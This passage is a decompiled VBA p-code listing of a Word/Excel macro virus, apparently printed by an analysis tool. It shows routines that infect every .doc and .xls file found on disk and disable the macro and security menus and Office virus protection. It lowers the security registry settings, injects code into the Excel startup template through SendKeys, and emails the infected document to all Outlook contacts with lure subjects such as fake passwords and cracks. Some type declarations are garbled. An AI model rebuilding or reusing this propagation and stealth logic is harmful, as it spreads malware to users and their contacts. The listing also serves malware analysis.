' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #168:
' 	StartForVariable 
' 	Ld iTemp2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iTemp 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #169:
' 	StartWithExpr 
' 	Ld iTemp2 
' 	Ld iTemp 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #170:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #171:
' 	LitStr 0x0005 "Saved"
' 	MemLdWith Properties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St sTemp 
' Line #172:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Ld iTemp2 
' 	Ld iTemp 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall fTouch 0x0002 
' 	EndIf 
' Line #173:
' 	EndWith 
' Line #174:
' 	StartForVariable 
' 	Ld iTemp2 
' 	EndForVariable 
' 	NextVar 
' Line #175:
' 	EndIfBlock 
' Line #176:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Private Sub fWordFileGrab(sFileName As String))
' Line #179:
' 	Dim 
' 	VarDefn dFSTarget (As <crash>)
' Line #180:
' 	Ld sFileName 
' 	ArgsLd LCase 0x0001 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd LCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #181:
' 	SetStmt 
' 	Ld sFileName 
' 	Ld Documents 
' 	ArgsMemLd Option 0x0001 
' 	Set dFSTarget 
' Line #182:
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	LitDI2 0x0001 
' 	Ld dFSTarget 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall fTouch 0x0002 
' Line #183:
' 	Ld dFSTarget 
' 	ArgsMemCall Save 0x0000 
' Line #184:
' 	Ld dFSTarget 
' 	ArgsMemCall Close 0x0000 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Private Sub fExcelFileGrab(sFileName As String))
' Line #188:
' 	Dim 
' 	VarDefn dFSTarget (As AddressOf)
' Line #189:
' 	Ld sFileName 
' 	ArgsLd LCase 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd FullName 
' 	ArgsLd LCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #190:
' 	SetStmt 
' 	Ld sFileName 
' 	Ld Workbooks 
' 	ArgsMemLd Option 0x0001 
' 	Set dFSTarget 
' Line #191:
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	LitDI2 0x0001 
' 	Ld dFSTarget 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall fTouch 0x0002 
' Line #192:
' 	Ld dFSTarget 
' 	ArgsMemCall Save 0x0000 
' Line #193:
' 	Ld dFSTarget 
' 	ArgsMemCall Close 0x0000 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Private Sub fDirectorySpawn())
' Line #197:
' 	OnError (Resume Next) 
' Line #198:
' 	Dim 
' 	VarDefn sSearchDir (As String)
' 	VarDefn sBeenThere (As String)
' 	VarDefn sKey (As String)
' 	VarDefn sSearchDirs (As String)
' Line #199:
' 	Dim 
' 	VarDefn iPoz (As Integer)
' 	VarDefn iTemp (As Integer)
' Line #200:
' 	Dim 
' 	VarDefn objFileSearch (As Object)
' Line #201:
' 	LitStr 0x0059 "C:\|C:\windows\desktop\|C:\my documents|C:\Program Files\Microsoft Office\Office\XLSTART|"
' 	St sSearchDirs 
' Line #202:
' 	Ld sSearchDirs 
' 	LitDI2 0x000E 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Concat 
' 	LitStr 0x0001 "|"
' 	Concat 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Concat 
' 	LitStr 0x0001 "|"
' 	Concat 
' 	St sSearchDirs 
' Line #203:
' 	Ld sSearchDirs 
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0001 "|"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0001 "|"
' 	Concat 
' 	St sSearchDirs 
' Line #204:
' 	Ld sSearchDirs 
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0001 "|"
' 	Concat 
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0001 "|"
' 	Concat 
' 	St sSearchDirs 
' Line #205:
' 	LitStr 0x0000 ""
' 	St sBeenThere 
' Line #206:
' 	Ld sSearchDirs 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #207:
' 	Ld sSearchDirs 
' 	LitStr 0x0001 "|"
' 	FnInStr 
' 	St iPoz 
' Line #208:
' 	Ld sSearchDirs 
' 	Ld iPoz 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St sSearchDir 
' Line #209:
' 	Ld sSearchDirs 
' 	Ld sSearchDirs 
' 	FnLen 
' 	Ld iPoz 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St sSearchDirs 
' Line #210:
' 	Ld sSearchDir 
' 	ArgsLd Trim 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sSearchDir 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St sSearchDir 
' 	EndIf 
' Line #211:
' 	Ld sBeenThere 
' 	Ld sSearchDir 
' 	ArgsLd LCase 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #212:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set objFileSearch 
' Line #213:
' 	StartWithExpr 
' 	Ld objFileSearch 
' 	With 
' Line #214:
' 	Ld sSearchDir 
' 	MemStWith LookIn 
' Line #215:
' 	Ld Application 
' 	MemLd New 
' 	SelectCase 
' Line #216:
' 	LitStr 0x000E "Microsoft Word"
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #217:
' 	LitStr 0x000F "Microsoft Excel"
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "*.xls"
' 	MemStWith FileName 
' Line #218:
' 	CaseElse 
' 	BoS 0x0000 
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' Line #219:
' 	EndSelect 
' Line #220:
' 	Ld msoSortByFileName 
' 	ParamNamed SortBy 
' 	Ld msoSortOrderAscending 
' 	ParamNamed SortOrder 
' 	ArgsMemLdWith Execute 0x0002 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #221:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #222:
' 	Ld Application 
' 	MemLd New 
' 	SelectCase 
' Line #223:
' 	LitStr 0x000E "Microsoft Word"
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld iTemp 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Paren 
' 	ArgsCall fWordFileGrab 0x0001 
' Line #224:
' 	LitStr 0x000F "Microsoft Excel"
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld iTemp 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Paren 
' 	ArgsCall fExcelFileGrab 0x0001 
' Line #225:
' 	EndSelect 
' Line #226:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #227:
' 	EndIfBlock 
' Line #228:
' 	EndWith 
' Line #229:
' 	Ld sBeenThere 
' 	LitStr 0x0001 "{"
' 	Concat 
' 	Ld sSearchDir 
' 	ArgsLd LCase 0x0001 
' 	Concat 
' 	LitStr 0x0001 "}"
' 	Concat 
' 	St sBeenThere 
' Line #230:
' 	EndIfBlock 
' Line #231:
' 	Loop 
' Line #232:
' 	SetStmt 
' 	LitNothing 
' 	Set objFileSearch 
' Line #233:
' 	EndSub 
' Line #234:
' 	FuncDefn (Private Sub fStealth(iSetting As Integer))
' Line #235:
' 	OnError (Resume Next) 
' Line #236:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #237:
' 	Ld iSetting 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	MemSt Enabled 
' Line #238:
' 	Ld iSetting 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #239:
' 	Ld iSetting 
' 	LitStr 0x0006 "Unhide"
' 	LitStr 0x0006 "Window"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #240:
' 	StartWithExpr 
' 	LitStr 0x0005 "Tools"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	With 
' 	BoS 0x0000 
' 	Ld iSetting 
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	Ld iSetting 
' 	LitStr 0x000C "Customize..."
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	Ld iSetting 
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	EndWith 
' Line #241:
' 	StartWithExpr 
' 	MemLdWith Options 
' 	With 
' 	BoS 0x0000 
' 	Ld iSetting 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	Ld iSetting 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	Ld iSetting 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	EndWith 
' Line #242:
' 	EndWith 
' Line #243:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #244:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #245:
' 	EndSub 
' Line #246:
' 	FuncDefn (Private Sub fGrabJugular(sApplication As String))
' Line #247:
' 	OnError (Resume Next) 
' Line #248:
' 	Dim 
' 	VarDefn sInputFile (As String)
' 	VarDefn sTemplateFile (As String)
' 	VarDefn sCommand (As String)
' Line #249:
' 	Dim 
' 	VarDefn lExternal (As Long)
' Line #250:
' 	Dim 
' 	VarDefn objApp (As Object)
' Line #251:
' 	Dim 
' 	VarDefn iTemp (As Integer)
' Line #252:
' 	LitStr 0x000B "C:\TEST.TXT"
' 	St sInputFile 
' Line #253:
' 	Ld sApplication 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Ld sInputFile 
' 	ArgsCall fTouchFile 0x0003 
' Line #254:
' 	LitStr 0x003D "C:\Program Files\Microsoft Office\Office\XLSTART\personal.xls"
' 	St sTemplateFile 
' Line #255:
' 	Ld sApplication 
' 	LitStr 0x0005 "Excel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld sTemplateFile 
' 	ArgsCall fDeleteFile 0x0001 
' 	EndIf 
' Line #256:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #257:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld sApplication 
' 	LitStr 0x000C ".Application"
' 	Concat 
' 	ArgsLd GetObject 0x0002 
' 	Set objApp 
' Line #258:
' 	LitVarSpecial (False)
' 	Paren 
' 	Ld objApp 
' 	MemLd Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #259:
' 	LitVarSpecial (False)
' 	Paren 
' 	Ld objApp 
' 	MemLd Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall Close 0x0001 
' Line #260:
' 	Ld objApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' Line #261:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #262:
' 	Ld sApplication 
' 	LitStr 0x0005 "Excel"
' 	Eq 
' 	IfBlock 
' Line #263:
' 	LitStr 0x0009 "EXCEL.EXE"
' 	St sCommand 
' Line #264:
' 	Ld sApplication 
' 	LitStr 0x0004 "Word"
' 	Eq 
' 	ElseIfBlock 
' Line #265:
' 	LitStr 0x000B "WINWORD.EXE"
' 	St sCommand 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	Ld sCommand 
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St lExternal 
' Line #268:
' 	Ld lExternal 
' 	ArgsCall AppActivate 0x0001 
' Line #269:
' 	Ld lExternal 
' 	ArgsCall AppActivate 0x0001 
' Line #270:
' 	Ld lExternal 
' 	ArgsCall AppActivate 0x0001 
' Line #271:
' 	Ld sApplication 
' 	LitStr 0x0005 "Excel"
' 	Eq 
' 	IfBlock 
' Line #272:
' 	LitStr 0x000E "~~~ {Down} ~~~"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #273:
' 	LitStr 0x0006 "%{F11}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #274:
' 	LitStr 0x0009 "%VP%VP%VP"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #275:
' 	LitStr 0x0006 "^R^R^R"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #276:
' 	LitStr 0x0012 "{PgDn}{PgDn}{PgDn}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #277:
' 	LitStr 0x0004 "{F7}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #278:
' 	LitStr 0x0003 "%IL"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #279:
' 	Ld sInputFile 
' 	LitStr 0x0001 "~"
' 	Concat 
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #280:
' 	Ld sApplication 
' 	LitStr 0x0004 "Word"
' 	Eq 
' 	ElseIfBlock 
' Line #281:
' 	LitStr 0x0009 "123{Down}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #282:
' 	LitStr 0x0006 "%{F11}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #283:
' 	LitStr 0x0009 "%VP^R^R^R"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #284:
' 	LitStr 0x0004 "{F7}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #285:
' 	LitStr 0x0007 "^+{End}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #286:
' 	LitStr 0x0006 "^A^A^A"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #287:
' 	LitStr 0x000F "{Del}{Del}{Del}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #288:
' 	LitStr 0x0003 "%IL"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #289:
' 	Ld sInputFile 
' 	LitStr 0x0001 "~"
' 	Concat 
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #290:
' 	EndIfBlock 
' Line #291:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #292:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld sApplication 
' 	LitStr 0x000C ".Application"
' 	Concat 
' 	ArgsLd GetObject 0x0002 
' 	Set objApp 
' Line #293:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #294:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	ParamOmitted 
' 	Ld sApplication 
' 	LitStr 0x000C ".Application"
' 	Concat 
' 	ArgsLd GetObject 0x0002 
' 	Set objApp 
' 	EndIf 
' Line #295:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #296:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #297:
' 	LitVarSpecial (False)
' 	Ld objApp 
' 	MemLd Application 
' 	MemSt Visible 
' Line #298:
' 	LitVarSpecial (False)
' 	Paren 
' 	Ld objApp 
' 	MemLd Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #299:
' 	Ld sTemplateFile 
' 	Ld objApp 
' 	MemLd Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #300:
' 	LitVarSpecial (False)
' 	Paren 
' 	Ld objApp 
' 	MemLd Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall Close 0x0001 
' Line #301:
' 	Ld objApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' Line #302:
' 	ElseBlock 
' Line #303:
' 	Ld sApplication 
' 	LitStr 0x0005 "Excel"
' 	Eq 
' 	IfBlock 
' Line #304:
' 	LitStr 0x0005 "%{F4}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #305:
' 	LitStr 0x0002 "%F"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #306:
' 	LitStr 0x0006 "^S^S^S"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #307:
' 	Ld sTemplateFile 
' 	LitStr 0x0001 "~"
' 	Concat 
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #308:
' 	LitStr 0x0006 "%{F4}N"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #309:
' 	Ld sApplication 
' 	LitStr 0x0004 "Word"
' 	Eq 
' 	ElseIfBlock 
' Line #310:
' 	LitStr 0x0005 "%{F4}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #311:
' 	LitStr 0x0007 "%{F4}NY"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #312:
' 	EndIfBlock 
' Line #313:
' 	EndIfBlock 
' Line #314:
' 	Ld sInputFile 
' 	ArgsCall fDeleteFile 0x0001 
' Line #315:
' 	SetStmt 
' 	LitNothing 
' 	Set objApp 
' Line #316:
' 	EndSub 
' Line #317:
' 	FuncDefn (Private Sub HaveOutlook())
' 	QuoteRem 0x001A 0x000E "will travel..."
' Line #318:
' 	OnError (Resume Next) 
' Line #319:
' 	Dim 
' 	VarDefn oApplication (As Object)
' 	VarDefn oMAPI (As Object)
' 	VarDefn oContact (As Object)
' 	VarDefn oMessage (As Object)
' 	VarDefn oRecipient (As Object)
' Line #320:
' 	Dim 
' 	VarDefn sSubject (As String)
' 	VarDefn sBody (As String)
' Line #321:
' 	Dim 
' 	VarDefn bDoneThat (As Boolean)
' Line #322:
' 	ArgsCall Read 0x0000 
' Line #323:
' 	OnError skip_outlook 
' Line #324:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set oApplication 
' Line #325:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld oApplication 
' 	ArgsMemLd GetNamespace 0x0001 
' 	Set oMAPI 
' Line #326:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	SelectCase 
' Line #327:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Here's "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0010 "Hope this helps."
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0004 "    "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St sBody 
' Line #328:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x001F "Hope this is what you wanted..."
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x000E "I've attached "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0024 ".  Let me know if there's a problem."
' 	Concat 
' 	St sBody 
' Line #329:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0022 "Hey John, check this out [private]"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0026 "(Make sure you don't show anyone else)"
' 	St sBody 
' Line #330:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0021 "Check out these sitez! {personal}"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x002D "Don't stay up TOO late checking these out :-)"
' 	St sBody 
' Line #331:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0018 "The report you requested"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0029 "If this isn't the right one, let me know."
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0004 "    "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St sBody 
' Line #332:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0016 "Check out these babes!"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0055 "You know the score, passwords to the latest batch of sites enclosed (courtesy of FoG)"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0038 "(Check out the girl on the entrance to site number 3...)"
' 	Concat 
' 	St sBody 
' Line #333:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0018 "New computer question..."
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0042 "Does this look right?  New PIII for $600?  What's missing from it?"
' 	St sBody 
' Line #334:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E "That report..."
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Here's "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0034 ".  This was what you wanted?  Call me if it isn't..."
' 	Concat 
' 	St sBody 
' Line #335:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0003 "..."
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0019 "Free porn site passwords!"
' 	St sBody 
' Line #336:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0016 "IMPORTANT: virus alert"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0019 "Do we need to be worried?"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0004 "    "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St sBody 
' Line #337:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0023 "Latest round of Bill Gates jokes..."
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0039 "Joke 4 nearly gave me a heart attack, I laughed so hard!!"
' 	St sBody 
' Line #338:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "<attachment>"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Here's "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0025 ", I hope this was the one you wanted."
' 	Concat 
' 	St sBody 
' Line #339:
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0021 "Microsoft Office 2000 code crack!"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0074 "I've attached the serial number, and FTP site/password.  Don't want to be caught out by Y2K (or spend $1300 either!)"
' 	St sBody 
' Line #340:
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Pictures"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x0071 "Here are those pictures of me you wanted -- enjoy ;).  I've put them in Word format, the password is 'LUVMYBODY'."
' 	St sBody 
' Line #341:
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0020 "New Windows Internet hack found!"
' 	St sSubject 
' 	BoS 0x0000 
' 	LitStr 0x002B "Check this out, do you think it's for real?"
' 	St sBody 
' Line #342:
' 	EndSelect 
' Line #343:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x000F 
' 	Lt 
' 	IfBlock 
' Line #344:
' 	StartForVariable 
' 	Ld oContact 
' 	EndForVariable 
' 	LitDI2 0x000A 
' 	Ld oMAPI 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	ForEach 
' Line #345:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld oApplication 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set oMessage 
' Line #346:
' 	SetStmt 
' 	Ld oContact 
' 	MemLd Email1Address 
' 	Ld oMessage 
' 	MemLd Recipients 
' 	ArgsMemLd Add 0x0001 
' 	Set oRecipient 
' Line #347:
' 	Ld bDoneThat 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld oRecipient 
' 	MemSt TypeOf 
' 	EndIf 
' Line #348:
' 	Ld oRecipient 
' 	ArgsMemCall Resolve 0x0000 
' Line #349:
' 	LitVarSpecial (True)
' 	St bDoneThat 
' Line #350:
' 	Ld sSubject 
' 	Ld oMessage 
' 	MemSt Subject 
' Line #351:
' 	Ld sBody 
' 	Ld oMessage 
' 	MemSt Body 
' Line #352:
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld oMessage 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #353:
' 	Ld oMessage 
' 	ArgsMemCall Send 0x0000 
' Line #354:
' 	StartForVariable 
' 	Ld oContact 
' 	EndForVariable 
' 	NextVar 
' Line #355:
' 	ElseBlock 
' Line #356:
' 	LitVarSpecial (False)
' 	St bDoneThat 
' Line #357:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld oApplication 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set oMessage 
' Line #358:
' 	StartForVariable 
' 	Ld oContact 
' 	EndForVariable 
' 	LitDI2 0x000A 
' 	Ld oMAPI 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	ForEach 
' Line #359:
' 	SetStmt 
' 	Ld oContact 
' 	MemLd Email1Address 
' 	Ld oMessage 
' 	MemLd Recipients 
' 	ArgsMemLd Add 0x0001 
' 	Set oRecipient 
